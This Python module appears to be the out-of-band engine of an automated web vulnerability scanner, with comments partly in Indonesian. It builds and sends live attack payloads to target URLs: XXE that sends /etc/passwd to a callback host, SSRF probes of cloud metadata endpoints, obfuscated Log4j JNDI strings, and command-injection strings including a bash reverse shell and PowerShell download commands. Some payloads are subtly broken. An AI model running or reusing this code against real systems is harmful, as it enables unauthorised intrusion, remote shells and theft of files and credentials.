"""
OOB ENGINE — Out-of-Band Interaction Engine
============================================
Private interactsh-server integration for blind vulnerability detection.

Infrastructure is configured through environment variables and is never embedded in source.

Usage:
    from engines.oob_engine import oob_engine

    # Generate unique payload
    payload = oob_engine.generate_payload("ssrf")  # "ssrf-a3f8c2.whoopbhapzham.my.id"

    # Inject ke target, tunggu callback
    result = oob_engine.test_and_poll("ssrf", poll_func=lambda: requests.get(target_url))
"""

import json
import os
import random
import string
import time
import threading
import requests
from typing import Optional, Dict, Any, Callable, List
from urllib.parse import quote


# ============================================================
# OOB CONFIGURATION
# ============================================================
OOB_DOMAIN = os.environ.get("OOB_DOMAIN", "")
OOB_SERVER_IP = os.environ.get("OOB_SERVER_IP", "")
OOB_AUTH_TOKEN = os.environ.get("OOB_AUTH_TOKEN", "")
OOB_LOGS_ENDPOINT = os.environ.get("OOB_LOGS_ENDPOINT", "")
OOB_POLL_TIMEOUT = 10  # seconds
OOB_POLL_INTERVAL = 2  # seconds between polls


def _random_id(length: int = 6) -> str:
    """Generate random alphanumeric ID."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _domain_of(url: str) -> str:
    from urllib.parse import urlparse
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url


def _logger():
    try:
        from custom_tools import exec_logger
        return exec_logger
    except Exception:
        return None


# ============================================================
# OOB ENGINE CLASS
# ============================================================
class OOBEngine:
    """
    Out-of-Band interaction engine.
    Handles payload generation, polling, and result mapping.
    """

    def __init__(self):
        if not OOB_DOMAIN or not OOB_LOGS_ENDPOINT:
            raise RuntimeError("OOB_DOMAIN and OOB_LOGS_ENDPOINT must be configured")
        self.domain = OOB_DOMAIN
        self.server_ip = OOB_SERVER_IP
        self.auth_token = OOB_AUTH_TOKEN
        self.logs_endpoint = OOB_LOGS_ENDPOINT
        self._lock = threading.Lock()

    # ── Payload Generation ────────────────────────────────────────────────────

    def generate_correlation_id(self, vuln_type: str) -> str:
        """
        Generate unique correlation ID for tracking.
        Format: {vuln_type}-{random6}
        Contoh: ssrf-a3f8c2, xxe-b7d1e4, rce-k9m2n5
        """
        return f"{vuln_type}-{_random_id(6)}"

    def generate_subdomain(self, vuln_type: str) -> str:
        """
        Generate full subdomain payload.
        Contoh: ssrf-a3f8c2.whoopbhapzham.my.id
        """
        return f"{self.generate_correlation_id(vuln_type)}.{self.domain}"

    def generate_url(self, vuln_type: str, path: str = "") -> str:
        """
        Generate full callback URL.
        Contoh: http://ssrf-a3f8c2.whoopbhapzham.my.id/path
        """
        subdomain = self.generate_subdomain(vuln_type)
        if path:
            path = path.lstrip("/")
            return f"http://{subdomain}/{path}"
        return f"http://{subdomain}"

    # ── Specific Payload Builders ─────────────────────────────────────────────

    def build_ssrf_payload(self, param: str = "url") -> Dict[str, str]:
        """
        Build SSRF payload.
        Returns dict with correlation_id, payload_url, dan beberapa format.
        """
        cid = self.generate_correlation_id("ssrf")
        subdomain = f"{cid}.{self.domain}"
        callback_url = f"http://{subdomain}"

        return {
            "correlation_id": cid,
            "subdomain": subdomain,
            "callback_url": callback_url,
            "payloads": {
                "url_param": callback_url,
                "ip_decimal": str(int.from_bytes(bytes([127, 0, 0, 1]), "big")),
                "ip_hex": "0x7f000001",
                "url_encoded": quote(callback_url),
                "dns_rebind": f"http://127.0.0.1.{subdomain}",
                "aws_metadata": "http://169.254.169.254/latest/meta-data/",
                "gcp_metadata": "http://metadata.google.internal/computeMetadata/v1/",
                "file_read": "file:///etc/passwd",
            },
            "header_payloads": {
                "X-Forwarded-Host": subdomain,
                "X-Forwarded-For": f"127.0.0.1, {subdomain}",
                "X-Original-URL": f"/{subdomain}",
                "X-Rewrite-URL": f"/{subdomain}",
                "Referer": callback_url,
                "Origin": callback_url,
            },
        }

    def build_xxe_payload(self, param: str = "data") -> Dict[str, Any]:
        """
        Build Blind XXE payload with external DTD callback.
        Returns dict with correlation_id, XML payloads, dan DTD content.
        """
        cid = self.generate_correlation_id("xxe")
        subdomain = f"{cid}.{self.domain}"
        dtd_url = f"http://{subdomain}/malicious.dtd"

        # Standard blind XXE — fetch file via external DTD
        xss_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{subdomain}/?data=%file;'>">
  %eval;
  %exfil;
]>
<root>&xxe;</root>"""

        # Simpler direct entity
        xxe_simple = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{subdomain}/xxe-test">
]>
<root><data>&xxe;</data></root>"""

        # SSRF via XXE
        xxe_ssrf = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>"""

        # SVG-based XXE
        xxe_svg = f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://{subdomain}/svg-xxe">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>"""

        # External DTD content (hosted or injected)
        dtd_content = f"""<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{subdomain}/?data=%file;'>">
%eval;
%exfil;"""

        return {
            "correlation_id": cid,
            "subdomain": subdomain,
            "dtd_url": dtd_url,
            "dtd_content": dtd_content,
            "payloads": {
                "blind_xxe": xss_payload,
                "simple_entity": xxe_simple,
                "ssrf_via_xxe": xxe_ssrf,
                "svg_upload": xxe_svg,
            },
            "content_types": [
                "application/xml",
                "text/xml",
                "application/soap+xml",
                "image/svg+xml",
            ],
        }

    def build_log4j_payload(self, param: str = "") -> Dict[str, str]:
        """
        Build Log4j (LogShell) JNDI injection payload.
        """
        cid = self.generate_correlation_id("log4j")
        subdomain = f"{cid}.{self.domain}"

        payloads = {
            "jndi_ldap": f"${{jndi:ldap://{subdomain}/a}}",
            "jndi_rmi": f"${{jndi:rmi://{subdomain}/a}}",
            "jndi_dns": f"${{jndi:dns://{subdomain}/a}}",
            "jndi_ldaps": f"${{jndi:ldaps://{subdomain}/a}}",
            "lowercase": f"${{jndi:ldap://{subdomain}/a}}",
            "upper_lower": f"${{jNdI:lDaP://{subdomain}/a}}",
            "env_lookup": f"${{jndi:ldap://{subdomain}/${{env:PATH}}}}",
            "nested": f"${{${{lower:j}}${{lower:n}}${{lower:d}}${{lower:i}}:ldap://{subdomain}/a}}",
        }

        # Header injection vectors (User-Agent, X-Api-Version, dll)
        header_vectors = {
            "User-Agent": payloads["jndi_ldap"],
            "X-Api-Version": payloads["jndi_ldap"],
            "X-Forwarded-For": f"127.0.0.1, {payloads['jndi_ldap']}",
            "Referer": f"https://example.com/{payloads['jndi_ldap']}",
            "Accept-Language": payloads["jndi_ldap"],
        }

        return {
            "correlation_id": cid,
            "subdomain": subdomain,
            "payloads": payloads,
            "header_vectors": header_vectors,
        }

    def build_rce_oob_payload(self, param: str = "cmd") -> Dict[str, str]:
        """
        Build Out-of-Band OS Command Injection payloads.
        """
        cid = self.generate_correlation_id("rce")
        subdomain = f"{cid}.{self.domain}"
        callback_url = f"http://{subdomain}"

        payloads = {
            "curl": f"curl {callback_url}",
            "wget": f"wget {callback_url}",
            "curl_silent": f"curl -s {callback_url}",
            "wget_quiet": f"wget -q -O- {callback_url}",
            "ping": f"ping -c 1 {subdomain}",
            "nslookup": f"nslookup {subdomain}",
            "dig": f"dig {subdomain}",
            "bash_tcp": f"bash -c 'exec bash -i &>/dev/tcp/{self.server_ip}/4444 <&1'",
            "python_http": f"python3 -c 'import urllib.request; urllib.request.urlopen(\"{callback_url}\")'",
            "perl_http": f"perl -e 'use LWP::Simple; get(\"{callback_url}\")'",
            "ruby_http": f"ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"{callback_url}\"))'",
            "windows_curl": f"curl.exe {callback_url}",
            "powershell": f"powershell -c \"(New-Object Net.WebClient).DownloadString('{callback_url}')\"",
        }

        return {
            "correlation_id": cid,
            "subdomain": subdomain,
            "callback_url": callback_url,
            "payloads": payloads,
        }

    def build_smuggling_oob_payload(self) -> Dict[str, str]:
        """
        Build HTTP Request Smuggling payload with OOB callback.
        """
        cid = self.generate_correlation_id("smuggle")
        subdomain = f"{cid}.{self.domain}"

        return {
            "correlation_id": cid,
            "subdomain": subdomain,
            "callback_url": f"http://{subdomain}",
        }

    def build_ssti_oob_payload(self) -> Dict[str, str]:
        """
        Build SSTI payload with OOB callback.
        """
        cid = self.generate_correlation_id("ssti")
        subdomain = f"{cid}.{self.domain}"
        callback_url = f"http://{subdomain}"

        payloads = {
            "jinja2_url": f"{{{{ ''.__class__.__mro__[1].__subclasses__() }}}}",
            "generic_curl": f"{{{{ ''.__class__.__mro__[1].__subclasses__() }}}}",
            "callback": callback_url,
        }

        return {
            "correlation_id": cid,
            "subdomain": subdomain,
            "callback_url": callback_url,
            "payloads": payloads,
        }

    def build_cors_oob_payload(self) -> Dict[str, str]:
        """
        Build CORS misconfig test payload with OOB origin.
        """
        cid = self.generate_correlation_id("cors")
        subdomain = f"{cid}.{self.domain}"

        return {
            "correlation_id": cid,
            "origin": f"http://{subdomain}",
            "subdomain": subdomain,
        }

    # ── Polling ───────────────────────────────────────────────────────────────

    def poll_logs(
        self,
        correlation_id: str,
        timeout: int = OOB_POLL_TIMEOUT,
        interval: float = OOB_POLL_INTERVAL,
    ) -> Dict[str, Any]:
        """
        Poll interactsh server logs for cek apakah ada interaction
        with correlation_id that dicari.

        Returns:
            {
                "status": "vulnerable" | "secure" | "error",
                "found": bool,
                "interactions": [...],
                "poll_duration": float,
                "poc_details": {...}
            }
        """
        start_time = time.monotonic()
        last_error = None

        while (time.monotonic() - start_time) < timeout:
            try:
                headers = {
                    "Authorization": self.auth_token,
                    "Accept": "application/json",
                }
                resp = requests.get(
                    self.logs_endpoint,
                    headers=headers,
                    timeout=5,
                    verify=False,
                )

                if resp.status_code == 200:
                    try:
                        data = resp.json()
                    except json.JSONDecodeError:
                        # Try parsing as plain text
                        data = {"data": []}

                    interactions = data.get("data", []) if isinstance(data, list) else data.get("data", [])

                    # Search for correlation_id in interactions
                    matches = self._find_matches(correlation_id, interactions)

                    if matches:
                        elapsed = time.monotonic() - start_time
                        return {
                            "status": "vulnerable",
                            "found": True,
                            "interactions": matches,
                            "interaction_count": len(matches),
                            "poll_duration": round(elapsed, 2),
                            "poc_details": {
                                "correlation_id": correlation_id,
                                "callback_domain": f"{correlation_id}.{self.domain}",
                                "server": f"{self.server_ip}",
                                "first_interaction": matches[0] if matches else None,
                                "protocols_seen": list(set(m.get("protocol", "unknown") for m in matches)),
                            },
                        }

                elif resp.status_code == 401:
                    return {
                        "status": "error",
                        "found": False,
                        "interactions": [],
                        "poll_duration": 0,
                        "error": "Authentication failed — check OOB_AUTH_TOKEN",
                        "poc_details": {},
                    }

            except requests.exceptions.Timeout:
                last_error = "Poll request timeout"
            except requests.exceptions.ConnectionError:
                last_error = "Cannot connect to OOB server"
            except Exception as e:
                last_error = str(e)

            time.sleep(interval)

        # Timeout reached — no interaction found
        elapsed = time.monotonic() - start_time
        return {
            "status": "secure",
            "found": False,
            "interactions": [],
            "poll_duration": round(elapsed, 2),
            "error": last_error,
            "poc_details": {},
        }

    def _find_matches(self, correlation_id: str, interactions: list) -> list:
        """
        Cari correlation_id di dalam interactions.
        Support DNS, HTTP, LDAP, SMTP protocols.
        """
        matches = []
        cid_lower = correlation_id.lower()

        for interaction in interactions:
            if not isinstance(interaction, dict):
                continue

            # Check full-id field
            full_id = str(interaction.get("full-id", "")).lower()
            if cid_lower in full_id:
                matches.append(interaction)
                continue

            # Check subdomain/remote-address
            remote = str(interaction.get("remote-address", "")).lower()
            if cid_lower in remote:
                matches.append(interaction)
                continue

            # Check protocol-specific fields
            protocol = str(interaction.get("protocol", "")).lower()

            if protocol == "dns":
                # Check DNS query
                dns_q = str(interaction.get("q", interaction.get("dns", {}).get("query", ""))).lower()
                if cid_lower in dns_q:
                    matches.append(interaction)
                    continue

            elif protocol == "http":
                # Check HTTP request path/headers
                http_raw = str(interaction.get("raw", interaction.get("http", {}).get("request", ""))).lower()
                if cid_lower in http_raw:
                    matches.append(interaction)
                    continue

            elif protocol == "ldap":
                # Check LDAP DN
                ldap_dn = str(interaction.get("dn", interaction.get("ldap", {}).get("dn", ""))).lower()
                if cid_lower in ldap_dn:
                    matches.append(interaction)
                    continue

            elif protocol == "smtp":
                # Check SMTP sender/recipients
                smtp_from = str(interaction.get("from", "")).lower()
                smtp_to = str(interaction.get("to", "")).lower()
                if cid_lower in smtp_from or cid_lower in smtp_to:
                    matches.append(interaction)
                    continue

            # Fallback: check all string values
            for v in interaction.values():
                if isinstance(v, str) and cid_lower in v.lower():
                    matches.append(interaction)
                    break

        return matches

    # ── High-Level Test Functions ─────────────────────────────────────────────

    def test_blind_ssrf(
        self,
        url: str,
        params: str = "",
        headers_json: str = "",
        exec_logger=None,
    ) -> Dict[str, Any]:
        """
        Full blind SSRF test:
        1. Generate OOB payload
        2. Inject ke target parameters/headers
        3. Poll for verify callback
        """
        from core.rate_limiter import rate_limiter
        domain = _domain_of(url)

        ssrf_payload = self.build_ssrf_payload()
        cid = ssrf_payload["correlation_id"]
        callback_url = ssrf_payload["callback_url"]

        if exec_logger:
            exec_logger.add_log("OOB Blind SSRF", "START",
                f"Testing blind SSRF on {url} | callback: {callback_url}")

        param_list = [p.strip() for p in params.split(",")] if params else [
            "url", "uri", "link", "src", "source", "href",
            "path", "dest", "destination", "redirect", "proxy",
            "fetch", "load", "file", "image", "callback",
            "webhook", "endpoint", "api", "service",
        ]

        inject_success = False
        inject_details = []

        # Test parameter injection
        for param in param_list[:8]:
            try:
                rate_limiter.wait(domain)
                test_url = f"{url}{'&' if '?' in url else '?'}{param}={quote(callback_url)}"
                resp = requests.get(test_url, timeout=8, verify=False, allow_redirects=False)
                inject_details.append({
                    "param": param,
                    "status": resp.status_code,
                    "method": "GET",
                })
                inject_success = True
            except Exception as e:
                inject_details.append({"param": param, "error": str(e)})

        # Test header injection
        custom_headers = {}
        if headers_json:
            try:
                custom_headers = json.loads(headers_json)
            except Exception:
                pass

        for header_name, header_val in ssrf_payload["header_payloads"].items():
            try:
                rate_limiter.wait(domain)
                resp = requests.get(
                    url,
                    headers={**custom_headers, header_name: header_val},
                    timeout=8, verify=False, allow_redirects=False
                )
                inject_details.append({
                    "header": header_name,
                    "status": resp.status_code,
                    "method": "HEADER",
                })
            except Exception as e:
                inject_details.append({"header": header_name, "error": str(e)})

        # Poll for OOB interaction
        if exec_logger:
            exec_logger.add_log("OOB Blind SSRF", "PROCESSING",
                f"Polling OOB server for correlation_id: {cid}")

        poll_result = self.poll_logs(cid)

        result = {
            "status": poll_result["status"],
            "found": poll_result["found"],
            "correlation_id": cid,
            "callback_url": callback_url,
            "injection_attempts": len(inject_details),
            "injection_details": inject_details,
            "poll_duration": poll_result["poll_duration"],
            "interactions": poll_result.get("interactions", []),
            "poc_details": poll_result.get("poc_details", {}),
        }

        if exec_logger:
            status_log = "WARNING" if poll_result["found"] else "SUCCESS"
            exec_logger.add_log("OOB Blind SSRF", status_log,
                f"Result: {poll_result['status']} | Interactions: {poll_result.get('interaction_count', 0)}")

        return result

    def test_blind_xxe(
        self,
        url: str,
        content_type: str = "application/xml",
        exec_logger=None,
    ) -> Dict[str, Any]:
        """
        Full blind XXE test:
        1. Generate OOB XXE payload
        2. Inject ke target
        3. Poll for verify callback
        """
        from core.rate_limiter import rate_limiter
        domain = _domain_of(url)

        xxe_payload = self.build_xxe_payload()
        cid = xxe_payload["correlation_id"]
        callback_url = f"http://{xxe_payload['subdomain']}"

        if exec_logger:
            exec_logger.add_log("OOB Blind XXE", "START",
                f"Testing blind XXE on {url} | callback: {callback_url}")

        inject_details = []

        # Test each XXE payload
        for payload_name, payload_xml in xxe_payload["payloads"].items():
            try:
                rate_limiter.wait(domain)
                resp = requests.post(
                    url,
                    data=payload_xml,
                    headers={"Content-Type": content_type},
                    timeout=8, verify=False
                )
                inject_details.append({
                    "payload": payload_name,
                    "status": resp.status_code,
                    "content_type": content_type,
                })
            except Exception as e:
                inject_details.append({"payload": payload_name, "error": str(e)})

        # Also try SVG upload if URL looks like upload endpoint
        if any(kw in url.lower() for kw in ["upload", "import", "file", "image"]):
            try:
                rate_limiter.wait(domain)
                svg_content = xxe_payload["payloads"]["svg_upload"].encode()
                files = {"file": ("payload.svg", svg_content, "image/svg+xml")}
                resp = requests.post(url, files=files, timeout=8, verify=False)
                inject_details.append({
                    "payload": "svg_upload_file",
                    "status": resp.status_code,
                    "method": "FILE_UPLOAD",
                })
            except Exception as e:
                inject_details.append({"payload": "svg_upload_file", "error": str(e)})

        # Poll for OOB interaction
        if exec_logger:
            exec_logger.add_log("OOB Blind XXE", "PROCESSING",
                f"Polling OOB server for correlation_id: {cid}")

        poll_result = self.poll_logs(cid)

        result = {
            "status": poll_result["status"],
            "found": poll_result["found"],
            "correlation_id": cid,
            "callback_url": callback_url,
            "dtd_url": xxe_payload["dtd_url"],
            "injection_attempts": len(inject_details),
            "injection_details": inject_details,
            "poll_duration": poll_result["poll_duration"],
            "interactions": poll_result.get("interactions", []),
            "poc_details": poll_result.get("poc_details", {}),
        }

        if exec_logger:
            status_log = "WARNING" if poll_result["found"] else "SUCCESS"
            exec_logger.add_log("OOB Blind XXE", status_log,
                f"Result: {poll_result['status']} | Interactions: {poll_result.get('interaction_count', 0)}")

        return result

    def test_log4j(
        self,
        url: str,
        params: str = "",
        exec_logger=None,
    ) -> Dict[str, Any]:
        """
        Full Log4j JNDI injection test:
        1. Generate JNDI payloads
        2. Inject via parameters dan headers
        3. Poll for verify callback
        """
        from core.rate_limiter import rate_limiter
        domain = _domain_of(url)

        log4j_payload = self.build_log4j_payload()
        cid = log4j_payload["correlation_id"]
        subdomain = log4j_payload["subdomain"]

        if exec_logger:
            exec_logger.add_log("OOB Log4j", "START",
                f"Testing Log4j JNDI on {url} | callback: {subdomain}")

        inject_details = []

        # Test via headers (most common vector)
        for header_name, payload in log4j_payload["header_vectors"].items():
            try:
                rate_limiter.wait(domain)
                resp = requests.get(
                    url,
                    headers={header_name: payload},
                    timeout=8, verify=False
                )
                inject_details.append({
                    "vector": f"Header: {header_name}",
                    "payload": payload,
                    "status": resp.status_code,
                })
            except Exception as e:
                inject_details.append({"vector": f"Header: {header_name}", "error": str(e)})

        # Test via parameters
        param_list = [p.strip() for p in params.split(",")] if params else [
            "q", "search", "query", "input", "data", "value",
            "name", "username", "email", "message", "text",
        ]

        for param in param_list[:5]:
            for payload_name, payload in list(log4j_payload["payloads"].items())[:3]:
                try:
                    rate_limiter.wait(domain)
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={quote(payload)}"
                    resp = requests.get(test_url, timeout=8, verify=False)
                    inject_details.append({
                        "vector": f"Param: {param} ({payload_name})",
                        "status": resp.status_code,
                    })
                except Exception as e:
                    inject_details.append({"vector": f"Param: {param}", "error": str(e)})

        # Poll for OOB interaction
        if exec_logger:
            exec_logger.add_log("OOB Log4j", "PROCESSING",
                f"Polling OOB server for correlation_id: {cid}")

        poll_result = self.poll_logs(cid)

        result = {
            "status": poll_result["status"],
            "found": poll_result["found"],
            "correlation_id": cid,
            "subdomain": subdomain,
            "injection_attempts": len(inject_details),
            "injection_details": inject_details,
            "poll_duration": poll_result["poll_duration"],
            "interactions": poll_result.get("interactions", []),
            "poc_details": poll_result.get("poc_details", {}),
        }

        if exec_logger:
            status_log = "WARNING" if poll_result["found"] else "SUCCESS"
            exec_logger.add_log("OOB Log4j", status_log,
                f"Result: {poll_result['status']} | Interactions: {poll_result.get('interaction_count', 0)}")

        return result

    def test_oob_rce(
        self,
        url: str,
        params: str = "",
        exec_logger=None,
    ) -> Dict[str, Any]:
        """
        Full OOB OS Command Injection test:
        1. Generate RCE OOB payloads
        2. Inject ke parameters
        3. Poll for verify callback
        """
        from core.rate_limiter import rate_limiter
        domain = _domain_of(url)

        rce_payload = self.build_rce_oob_payload()
        cid = rce_payload["correlation_id"]
        callback_url = rce_payload["callback_url"]

        if exec_logger:
            exec_logger.add_log("OOB RCE", "START",
                f"Testing OOB RCE on {url} | callback: {callback_url}")

        param_list = [p.strip() for p in params.split(",")] if params else [
            "cmd", "exec", "command", "ping", "host", "ip",
            "query", "search", "input", "data", "file", "path",
            "url", "q", "shell", "bash", "sh",
        ]

        inject_details = []

        for param in param_list[:6]:
            for payload_name, payload in list(rce_payload["payloads"].items())[:4]:
                try:
                    rate_limiter.wait(domain)
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={quote(payload)}"
                    resp = requests.get(test_url, timeout=8, verify=False)
                    inject_details.append({
                        "param": param,
                        "payload_type": payload_name,
                        "status": resp.status_code,
                    })
                except Exception as e:
                    inject_details.append({"param": param, "error": str(e)})

        # Poll for OOB interaction
        if exec_logger:
            exec_logger.add_log("OOB RCE", "PROCESSING",
                f"Polling OOB server for correlation_id: {cid}")

        poll_result = self.poll_logs(cid)

        result = {
            "status": poll_result["status"],
            "found": poll_result["found"],
            "correlation_id": cid,
            "callback_url": callback_url,
            "injection_attempts": len(inject_details),
            "injection_details": inject_details,
            "poll_duration": poll_result["poll_duration"],
            "interactions": poll_result.get("interactions", []),
            "poc_details": poll_result.get("poc_details", {}),
        }

        if exec_logger:
            status_log = "WARNING" if poll_result["found"] else "SUCCESS"
            exec_logger.add_log("OOB RCE", status_log,
                f"Result: {poll_result['status']} | Interactions: {poll_result.get('interaction_count', 0)}")

        return result


# Global instance
oob_engine = OOBEngine()
